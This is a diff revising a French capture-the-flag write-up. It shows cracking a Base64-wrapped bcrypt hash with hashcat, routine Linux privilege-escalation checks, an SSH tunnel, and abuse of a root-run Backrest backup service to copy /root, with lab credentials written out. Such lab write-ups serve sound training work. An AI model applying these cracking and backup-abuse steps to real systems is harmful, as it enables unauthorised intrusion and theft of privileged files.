@@ -1079,7 +1079,11 @@ Tu observes que :
 
 Lors de l’analyse du contexte, un élément attire ton attention : l’utilisateur `gael` appartient au groupe `sysadm`.
 
-Ce type de groupe est souvent utilisé pour des tâches d’administration et peut donner accès à des fichiers sensibles.
+Ce type de groupe est généralement associé à des tâches d’administration système.
+
+Concrètement, cela signifie qu’il peut donner accès à des fichiers ou des répertoires normalement réservés à des utilisateurs privilégiés.
+
+Dans un contexte CTF, ce type d’accès indirect constitue souvent une piste exploitable : il peut notamment permettre d’accéder à des sauvegardes, des fichiers de configuration ou d’autres données sensibles.
 
 Tu décides donc d’explorer cette piste en recherchant les fichiers accessibles par ce groupe :
 
@@ -1232,7 +1236,9 @@ Le champ `passwordBcrypt` contient la valeur suivante :
 JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP
 ```
 
-Cette chaîne ne correspond pas directement à un hash bcrypt classique (qui commence par `$2a$`), mais plusieurs indices indiquent qu’il s’agit d’un encodage **Base64** : elle ne contient que des caractères autorisés (lettres, chiffres, `/`), ne comporte aucun caractère `$`, et le nom du champ (`passwordBcrypt`) suggère qu’un hash bcrypt est attendu. Tu valides cette hypothèse en la décodant :
+Cette chaîne ne correspond pas directement à un hash bcrypt classique (qui commence par `$2a$`).
+
+Sa structure indique qu’il s’agit d’un encodage **Base64**. Tu la décodes donc :
 
 ```bash
 echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
@@ -1246,64 +1252,18 @@ $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
 
 Le préfixe `$2a$10$` confirme qu’il s’agit bien d’un **hash bcrypt valide**.
 
-~~~bash
-Tu places ensuite le hash bcrypt dans `hashcat` avec le mode `3200`, correspondant à bcrypt :
+Tu peux maintenant le casser avec `hashcat` :
 
-```bash
+~~~bash
 hashcat -m 3200 \
   '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' \
   /usr/share/wordlists/rockyou.txt
 ~~~
 
-Hashcat identifie correctement le format :
-
-```bash
-Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
-Status...........: Cracked
-```
-
 Le mot de passe est retrouvé rapidement :
 
 ```bash
 b$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
-```
-
-Tu obtiens donc les identifiants suivants pour l’interface Backrest :
-
-```bash
-backrest_root:!@#$%^
-```
-
-Tu peux également utiliser John pour tenter de casser le hash bcrypt.
-
-Tu commences par décoder la valeur Base64 et l’enregistrer dans un fichier :
-
-```bash
-echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d > hash.txt
-```
-
-Tu lances ensuite John avec la wordlist `rockyou.txt` :
-
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
-
-John détecte automatiquement le format bcrypt :
-
-```
-Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
-```
-
-Le mot de passe est trouvé rapidement :
-
-```bash
-!@#$%^
-```
-
-Tu peux confirmer le résultat avec :
-
-```bash
-john --show hash.txt
 ```
 
 Tu obtiens ainsi les identifiants suivants :
@@ -1318,7 +1278,16 @@ Tu cherches alors à identifier le service associé à ce compte. La première i
 
 Toutefois, afin de ne rien manquer, tu choisis de suivre la méthodologie complète décrite dans la recette {{< recette privilege-escalation-linux >}}, en poursuivant l’énumération de manière structurée.
 
-### Recherche de binaires SUID
+### Vérifications classiques d’escalade
+
+Tu poursuis l’énumération en appliquant les vérifications classiques de la méthode :
+
+- recherche de binaires SUID
+- analyse des capabilities Linux
+- inspection des tâches cron
+- observation des processus avec `pspy64`
+
+#### SUID
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
@@ -1326,7 +1295,7 @@ find / -perm -4000 -type f 2>/dev/null
 
 Aucun binaire inhabituel ou exploitable n’est identifié.
 
-### Analyse des Linux capabilities
+#### capabilities
 
 ```bash
 getcap -r / 2>/dev/null
@@ -1334,7 +1303,7 @@ getcap -r / 2>/dev/null
 
 Aucune capability exploitable n’est trouvée.
 
-### Vérification des SUID avec suid3num.py
+#### Vérification complémentaire avec suid3num
 
 ```bash
 cd /dev/shm
@@ -1344,14 +1313,15 @@ python3 suid3num.py
 - aucun binaire personnalisé n’est identifié
 - aucun binaire exploitable via GTFOBins n’est détecté
 
-### Inspection des tâches cron
+#### Tâches cron
+
 ```bash
 cat /etc/crontab
 ```
 
 Seules les tâches système par défaut sont présentes.
 
-### pspy64
+#### pspy64
 
 Tu observes les processus exécutés par root avec pspy64.
 
@@ -1398,13 +1368,42 @@ Ces recherches te permettent d’identifier que :
 
 Les vérifications classiques (sudo, SUID, capabilities, suid3num, cron, pspy64) ne révèlent aucune piste exploitable.
 
-En revanche, l’accès à une sauvegarde via le groupe `sysadm` t’a permis de récupérer des identifiants pour **Backrest**, et l’analyse des fichiers de configuration a révélé que ce service est exécuté localement sur le port **9898**.
+En revanche, un élément ressort clairement de l’analyse :
+
+- l’appartenance au groupe `sysadm`
+- l’accès à une sauvegarde dans `/var/backups`
+- la présence d’identifiants pour le service **Backrest**
+
+Ces éléments ne sont pas isolés : ils forment une chaîne logique.
+
+Tu identifies alors une piste cohérente :
+
+- un service de sauvegarde accessible localement
+- des identifiants valides pour ce service
+- et potentiellement un accès indirect à des fichiers sensibles
+
+L’analyse des fichiers de configuration confirme que **Backrest** est exécuté localement sur le port **9898**.
+
+Tu disposes maintenant de tous les éléments nécessaires pour tenter une exploitation.
 
 
 
 ### Exploitation de Backrest
 
 L’accès à l’interface Backrest sur le port **9898** permet d’interagir directement avec le système de sauvegarde.
+
+Ce point est essentiel :
+ Backrest s’exécute avec des privilèges élevés afin de pouvoir sauvegarder l’ensemble du système, y compris des répertoires sensibles comme `/root`.
+
+Même si tu es connecté en tant qu’utilisateur `gael`, les actions réalisées via l’interface sont exécutées avec les droits du service.
+
+Concrètement, cela signifie que :
+
+- tu peux demander à Backrest de lire `/root`
+- de créer une sauvegarde de ce répertoire
+- puis de restaurer son contenu dans un emplacement accessible
+
+Ce mécanisme permet de contourner les restrictions classiques et d’accéder indirectement à des fichiers normalement inaccessibles.
 
 Le service n’étant accessible qu’en local, tu mets en place un tunnel SSH depuis ta machine Kali avec le compte `gael:mattp005numbertwo` :
 
@@ -1422,7 +1421,7 @@ Tu accèdes à l’interface avec les identifiants `backrest_root:!@#$%^`
 
 ![Page de connexion Backrest avec champ utilisateur backrest_root](backrest-login.png)
 
-#### Accès à l’interface
+#### Accès à l’interface principale
 
 Une fois connecté, tu arrives sur l’interface principale :
 
@@ -1504,33 +1503,35 @@ tar -xzf [date].tar.gz
 
 Tu obtiens ainsi une copie complète du contenu de `/root`, incluant les fichiers sensibles et le flag `root.txt`.
 
+### root.txt
 
-
-contenu de /root sur ton Kali
+Le fichier `root.txt` est présent dans l’archive extraite :
 
 ```bash
-\root\.bashrc
-\root\.bash_history
-\root\.profile
-\root\.python_history
-\root\root.txt
-\root\.local\share\backrest
-\root\.local\share\nano
-\root\.local\share\backrest\processlogs
-\root\.local\share\backrest\tasklogs
-\root\.local\share\backrest\install.lock
-\root\.local\share\backrest\jwt-secret
-\root\.local\share\backrest\oplog.sqlite
-\root\.local\share\backrest\oplog.sqlite.lock
-\root\.local\share\backrest\processlogs\backrest.log
-\root\.local\share\backrest\tasklogs\logs.sqlite
-\root\.local\share\nano\search_history
-\root\.ssh\authorized_keys
-\root\.ssh\id_rsa
-\root\scripts\cleanup.sh
-\root\scripts\config.json
+ls -la root
 
+total 12
+drwxr-xr-x 2 kali kali    0 May  1 11:21 .
+drwxr-xr-x 2 kali kali    0 May  1 11:27 ..
+-rw-r--r-- 1 kali kali    0 Apr 30 11:06 .bash_history
+-rw-r--r-- 1 kali kali 3106 Dec  5  2019 .bashrc
+drwxr-xr-x 2 kali kali    0 May  1 10:19 .cache
+drwxr-xr-x 2 kali kali    0 May  1 10:19 .local
+-rw-r--r-- 1 kali kali  161 Dec  5  2019 .profile
+-rw-r--r-- 1 kali kali    0 Apr 30 11:06 .python_history
+-rw-r--r-- 1 kali kali   33 Apr 30 11:08 root.txt
+drwxr-xr-x 2 kali kali    0 May  1 10:19 scripts
+drwxr-xr-x 2 kali kali    0 May  1 10:19 .ssh
 ```
+
+Son contenu peut être affiché avec :
+
+```bash
+cat root/root.txt
+64b6xxxxxxxxxxxxxxxxxxxxxxxxd161
+```
+
+La récupération du flag `root.txt` confirme la compromission complète de la machine.
 
 
 
@@ -1542,8 +1543,6 @@ contenu de /root sur ton Kali
 - Points d'apprentissage personnels.
 
 ---
-
-## Pièces jointes 
 
 ## Pièces jointes
 
